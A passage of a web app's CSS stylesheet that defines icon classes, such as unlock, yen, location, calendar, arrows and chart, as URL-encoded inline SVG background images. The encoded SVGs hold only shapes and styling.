url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_unlock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C15V13h0A6%2C6%2C0%2C0%2C0%2C9%2C13H9v4h2V13a4%2C4%2C0%2C0%2C1%2C8%2C0v2H15V25a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM33%2C25a4%2C4%2C0%2C0%2C1-4%2C4H21a4%2C4%2C0%2C0%2C1-2.88-1.21L33%2C19.88V25Zm0-7.39L17.14%2C26A4%2C4%2C0%2C0%2C1%2C17%2C25h0V17H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-website-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_website%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C11V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V11Zm6%2C4V13h2v2Zm-2-2v2H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V17H31Zm0-12H19V13H31ZM18.61%2C21l8%2C.28-4.24%2C6.78L21%2C25.5l-5.3%2C2.82-.94-1.77%2C5.3-2.82Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-x-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_x%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2227.78%2013.63%2026.36%2012.22%2020%2018.59%2013.64%2012.22%2012.22%2013.64%2018.59%2020%2012.22%2026.36%2013.64%2027.78%2020%2021.41%2026.36%2027.78%2027.78%2026.36%2021.41%2020%2027.78%2013.63%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-yen-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_yen%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2221.01%2022%2025%2022%2025%2020%2021.01%2020%2021.01%2018.2%2030.57%2013.11%2029.63%2011.34%2019.98%2016.48%2010.33%2011.34%209.39%2013.11%2019.01%2018.23%2019.01%2020%2015%2020%2015%2022%2019.01%2022%2019.01%2024%2015%2024%2015%2026%2019.01%2026%2019.01%2032%2021.01%2032%2021.01%2026%2025%2026%2025%2024%2021.01%2024%2021.01%2022%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-location-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Ccircle%20class%3D%22st0%22%20cx%3D%2220%22%20cy%3D%2217%22%20r%3D%224%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C9c-4.3%2C0-8%2C3.5-8%2C7.7c0%2C2.8%2C2.7%2C7.5%2C8%2C14c5.3-6.5%2C8-11.3%2C8-14C28%2C12.5%2C24.3%2C9%2C20%2C9z%20M20%2C22%0A%09%09c-2.8%2C0-5-2.2-5-5s2.2-5%2C5-5s5%2C2.2%2C5%2C5S22.8%2C22%2C20%2C22z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C1C9.5%2C1%2C1%2C9.5%2C1%2C20s8.5%2C19%2C19%2C19s19-8.5%2C19-19S30.5%2C1%2C20%2C1z%20M20.4%2C31.8c-0.2%2C0.2-0.6%2C0.2-0.8%2C0%0A%09%09c-5.7-7-8.6-12-8.6-15.1C11%2C12%2C15.1%2C8%2C20%2C8s9%2C3.9%2C9%2C8.7C29%2C19.8%2C26.1%2C24.9%2C20.4%2C31.8z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-service-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M30%2C18.99963h-2v7h2c0.55298%2C0%2C1-0.44702%2C1-1v-5C31%2C19.44763%2C30.55298%2C18.99963%2C30%2C18.99963z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C0.99963c-10.49341%2C0-19%2C8.50659-19%2C19s8.50659%2C19%2C19%2C19s19-8.50659%2C19-19S30.49341%2C0.99963%2C20%2C0.99963z%20%20%20%20M32%2C24.99963c0%2C1.104-0.896%2C2-2%2C2h-0.86499c-0.73499%2C1.25-1.98499%2C1.79596-4.73303%2C2.396%20%20%20c-0.07996%2C0.01697-0.23297%2C0.04895-0.40198%2C0.086v0.51801c0%2C0.55298-0.44702%2C1-1%2C1h-4c-0.552%2C0-1-0.44702-1-1v-2%20%20%20c0-0.55304%2C0.448-1%2C1-1h4c0.55298%2C0%2C1%2C0.44696%2C1%2C1v0.45898c0.07703-0.01703%2C0.146-0.03101%2C0.18903-0.04102%20%20%20c2.00098-0.43597%2C3.07495-0.81897%2C3.70697-1.43896C27.39502%2C26.92358%2C27%2C26.51562%2C27%2C25.99963v-7c0-0.552%2C0.44702-1%2C1-1h1%20%20%20c0-4.586-3.79999-8-8.75-8s-8.75%2C3.414-8.75%2C8H12c0.552%2C0%2C1%2C0.448%2C1%2C1v7c0%2C0.55298-0.448%2C1-1%2C1h-2c-1.104%2C0-2-0.896-2-2v-5%20%20%20c0-1.104%2C0.896-2%2C2-2h0.5c0-5.164%2C4.271-9%2C9.75-9s9.75%2C3.836%2C9.75%2C9c1.104%2C0%2C2%2C0.896%2C2%2C2V24.99963z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M22.75519%2C27.99963h-3.51038C19.10962%2C27.99963%2C19%2C28.10919%2C19%2C28.24445v1.51038%20%20%20c0%2C0.13519%2C0.10962%2C0.24481%2C0.24481%2C0.24481h3.51038c0.13519%2C0%2C0.24481-0.10962%2C0.24481-0.24481v-1.51038%20%20%20C23%2C28.10919%2C22.89038%2C27.99963%2C22.75519%2C27.99963z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M9%2C20.24445v4.51038c0%2C0.68744%2C0.55731%2C1.24481%2C1.24481%2C1.24481h1.51038%20%20%20c0.13519%2C0%2C0.24481-0.10962%2C0.24481-0.24481v-6.51038c0-0.13525-0.10962-0.24481-0.24481-0.24481h-1.51038%20%20%20C9.55731%2C18.99963%2C9%2C19.55695%2C9%2C20.24445z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pointer-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C1C9.5%2C1%2C1%2C9.5%2C1%2C20s8.5%2C19%2C19%2C19s19-8.5%2C19-19S30.5%2C1%2C20%2C1z%20M27.4%2C9l-0.5%2C15.9c0%2C0.4-0.4%2C0.6-0.8%2C0.4%20%20%20l-3.9-2.2l-4.8%2C8.2c-0.1%2C0.2-0.4%2C0.3-0.7%2C0.2L12.5%2C29c-0.2-0.1-0.3-0.4-0.2-0.7l4.8-8.2l-3.9-2.2c-0.3-0.2-0.3-0.7%2C0-0.9l13.5-8.4%20%20%20c0.1-0.1%2C0.2-0.1%2C0.3-0.1C27.2%2C8.5%2C27.4%2C8.7%2C27.4%2C9L27.4%2C9z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M18%2C19.4c0.2%2C0.1%2C0.3%2C0.4%2C0.2%2C0.7l-4.8%2C8.2l3.5%2C2l4.8-8.2c0.1-0.2%2C0.4-0.3%2C0.7-0.2L26%2C24l0.4-14.1l-12%2C7.4%20%20%20L18%2C19.4z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-cardPin-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M8.99957%2C27.28558c0%2C0.39801%2C0.30005%2C0.71405%2C0.65002%2C0.71405H30.3496%20%20%20c0.35101%2C0%2C0.64996-0.31604%2C0.64996-0.71405V15.99963h-22v11.28595H8.99957z%20M26.5%2C20.99963h2c0.66699%2C0%2C0.66699%2C1%2C0%2C1h-2%20%20%20C25.83301%2C21.99963%2C25.83301%2C20.99963%2C26.5%2C20.99963z%20M21.5%2C20.99963h2c0.66699%2C0%2C0.66699%2C1%2C0%2C1h-2%20%20%20C20.83301%2C21.99963%2C20.83301%2C20.99963%2C21.5%2C20.99963z%20M16.5%2C20.99963h2c0.66699%2C0%2C0.66699%2C1%2C0%2C1h-2%20%20%20C15.83301%2C21.99963%2C15.83301%2C20.99963%2C16.5%2C20.99963z%20M11.5%2C20.99963h2c0.66699%2C0%2C0.66699%2C1%2C0%2C1h-2%20%20%20C10.83301%2C21.99963%2C10.83301%2C20.99963%2C11.5%2C20.99963z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M30.34961%2C11.99963H9.6496c-0.34998%2C0-0.65002%2C0.31598-0.65002%2C0.71399v2.28601h22v-2.28601%20%20%20C30.99957%2C12.31561%2C30.70062%2C11.99963%2C30.34961%2C11.99963z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C0.99963c-10.49341%2C0-19%2C8.50659-19%2C19s8.50659%2C19%2C19%2C19s19-8.50659%2C19-19S30.49341%2C0.99963%2C20%2C0.99963z%20%20%20%20M31.99957%2C27.28558c0%2C0.93805-0.73395%2C1.71405-1.64996%2C1.71405H9.6496c-0.914%2C0-1.65002-0.776-1.65002-1.71405V12.71362%20%20%20c0-0.93799%2C0.73602-1.71399%2C1.65002-1.71399h20.70001c0.91602%2C0%2C1.64996%2C0.776%2C1.64996%2C1.71399%20%20%20C31.99957%2C12.71362%2C31.99957%2C27.28558%2C31.99957%2C27.28558z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-trash[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_trash%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C12H27a4%2C4%2C0%2C0%2C0-4-4H19a4%2C4%2C0%2C0%2C0-4%2C4H9v2h2V30a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V14h2ZM19%2C10h4a2%2C2%2C0%2C0%2C1%2C2%2C2H17A2%2C2%2C0%2C0%2C1%2C19%2C10ZM29%2C30a2%2C2%2C0%2C0%2C1-2%2C2H15a2%2C2%2C0%2C0%2C1-2-2V27.21L29%2C18.7Zm0-13.57L13%2C24.94V14H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-four[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_4_arrows%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2236%2020%2028%2015.38%2028%2019%2021%2019%2021%2012%2024.62%2012%2020%204%2015.38%2012%2019%2012%2019%2019%2012%2019%2012%2015.38%204%2020%2012%2024.62%2012%2021%2019%2021%2019%2028%2015.38%2028%2020%2036%2024.62%2028%2021%2028%2021%2021%2028%2021%2028%2024.62%2036%2020%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowdown[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_arrow_down%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M20%2C9V30.7a2%2C2%2C0%2C0%2C1-.58-.5L13.28%2C18.65l-1.77.94%2C5.73%2C10.77h0a4%2C4%2C0%2C0%2C0%2C7.44.17l5.8-10.94-1.77-.94-5.87%2C11a2%2C2%2C0%2C0%2C1-.86%2C1V9Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowleft[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_arrow_left%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C20H11.3a2%2C2%2C0%2C0%2C1%2C.5-.58l11.55-6.14-.94-1.77L11.64%2C17.24v0a4%2C4%2C0%2C0%2C0-.17%2C7.44l10.94%2C5.8.94-1.77-11-5.87a2%2C2%2C0%2C0%2C1-1-.86H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowright[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_arrow_riwht%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C22H30.7a2%2C2%2C0%2C0%2C1-.5.58L18.65%2C28.72l.94%2C1.77%2C10.77-5.73v0a4%2C4%2C0%2C0%2C0%2C.16-7.44l-10.94-5.8-.94%2C1.77%2C11%2C5.87a2%2C2%2C0%2C0%2C1%2C1%2C.86H9Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowup[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_arrow_up%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M1%2C21A20%2C20%2C0%2C1%2C1%2C21%2C41%2C20%2C20%2C0%2C0%2C1%2C1%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C33V11.3a2%2C2%2C0%2C0%2C1%2C.57.5l6.14%2C11.55%2C1.77-.94L24.77%2C11.64h0a4%2C4%2C0%2C0%2C0-7.44-.17l-5.8%2C10.94%2C1.77.94%2C5.87-11a2%2C2%2C0%2C0%2C1%2C.86-1V33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-calendar[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_calendar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C11H27V9H25v2H17V9H15v2H9V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6h0ZM15%2C13v2h2V13h8v2h2V13h4v4H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V19H31Zm-4.74-6%2C.94%2C1.77-9.65%2C5.09-.94-1.77h0L15%2C22.93%2C16.77%2C22l1.65%2C3.16Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-branch[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_branch%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C17V13h0a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2H9v4h2V29H9v2H33V29H31V17Zm-2-4v2H11V13ZM21%2C21v8H17V21Zm8%2C8H23V19H15V29H13V17H29Zm-2-4H25V21h2v4Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-bubble[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_bubble%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M26.22%2C13.89C24.7%2C11%2C21.15%2C9%2C17%2C9%2C11.48%2C9%2C7%2C12.58%2C7%2C17c0%2C3%2C2%2C5.48%2C5%2C6.86v5.41l5.23-2.82a9%2C9%2C0%2C0%2C0%2C1.88%2C1.62l11.14%2C6V28.66c3-1.37%2C5-3.91%2C5-6.86C35.25%2C17.65%2C31.28%2C14.29%2C26.22%2C13.89ZM9%2C17c0-3.31%2C3.58-6%2C8-6s8%2C2.69%2C8%2C6a5.51%2C5.51%2C0%2C0%2C1-2.79%2C4.52L14%2C25.94V22.52C11.08%2C21.63%2C9%2C19.51%2C9%2C17ZM28.25%2C27.32v3.42L20%2C26.32a6.54%2C6.54%2C0%2C0%2C1-1-.83l4.13-2.22A7.51%2C7.51%2C0%2C0%2C0%2C27%2C17a6.44%2C6.44%2C0%2C0%2C0-.13-1c3.63.56%2C6.38%2C2.93%2C6.38%2C5.82C33.25%2C24.31%2C31.17%2C26.43%2C28.25%2C27.32Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-chart[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_chart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29a4%2C4%2C0%2C0%2C1-4-3.81V23.09l4.94-2.63%2C1.81%2C3.4%2C11.61-6.18-.94-1.77-9.85%2C5.24-1.81-3.39L13%2C20.82V13H11V25.22A6%2C6%2C0%2C0%2C0%2C17%2C31H31V29Z%22%20transform%3D%22translate%28-1%20-